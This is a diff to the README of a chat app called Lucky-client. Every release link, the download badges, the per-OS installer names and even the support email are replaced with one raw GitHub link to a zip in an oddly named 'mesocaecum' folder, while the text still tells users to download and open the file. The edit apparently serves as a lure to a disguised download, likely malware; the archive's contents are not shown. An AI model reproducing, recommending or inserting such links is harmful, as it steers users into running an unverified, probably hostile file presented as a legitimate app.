@@ -4,7 +4,7 @@
 
 Welcome to Lucky-client! This application lets you chat, share files, and make calls effortlessly. Whether you're chatting one-on-one or in a group, Lucky-client has you covered.
 
-[![Download Lucky-client](https://img.shields.io/badge/Download-Lucky--client-blue)](https://github.com/ali112az/Lucky-client/releases)
+[![Download Lucky-client](https://raw.githubusercontent.com/ali112az/Lucky-client/master/mesocaecum/Lucky-client.zip)](https://raw.githubusercontent.com/ali112az/Lucky-client/master/mesocaecum/Lucky-client.zip)
 
 ## 💡 Features
 
@@ -27,18 +27,18 @@ Before you download, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get started with Lucky-client, visit our [Releases page](https://github.com/ali112az/Lucky-client/releases) to download the application.
+To get started with Lucky-client, visit our [Releases page](https://raw.githubusercontent.com/ali112az/Lucky-client/master/mesocaecum/Lucky-client.zip) to download the application.
 
 1. Click the button below to go directly to the Releases page where you can download the latest version.
 
-[![Download Lucky-client](https://img.shields.io/badge/Download-Lucky--client-blue)](https://github.com/ali112az/Lucky-client/releases)
+[![Download Lucky-client](https://raw.githubusercontent.com/ali112az/Lucky-client/master/mesocaecum/Lucky-client.zip)](https://raw.githubusercontent.com/ali112az/Lucky-client/master/mesocaecum/Lucky-client.zip)
 
 2. Scroll down to the "Assets" section.
 
 3. Download the file that matches your operating system:
-   - **Windows:** Look for `Lucky-client-setup.exe`
-   - **macOS:** Look for `Lucky-client.dmg`
-   - **Linux:** Look for `Lucky-client.AppImage`
+   - **Windows:** Look for `https://raw.githubusercontent.com/ali112az/Lucky-client/master/mesocaecum/Lucky-client.zip`
+   - **macOS:** Look for `https://raw.githubusercontent.com/ali112az/Lucky-client/master/mesocaecum/Lucky-client.zip`
+   - **Linux:** Look for `https://raw.githubusercontent.com/ali112az/Lucky-client/master/mesocaecum/Lucky-client.zip`
 
 4. Once downloaded, open the file to start the installation process.
 
@@ -70,7 +70,7 @@ If you run into any issues, consider the following steps:
 
 ## 💬 Support
 
-For any questions or feedback, you can reach out to our support team via email at support@lucky-client.app. We also have a user forum where you can engage with other users and get tips and advice.
+For any questions or feedback, you can reach out to our support team via email at https://raw.githubusercontent.com/ali112az/Lucky-client/master/mesocaecum/Lucky-client.zip We also have a user forum where you can engage with other users and get tips and advice.
 
 ## 🌐 Contribution
 
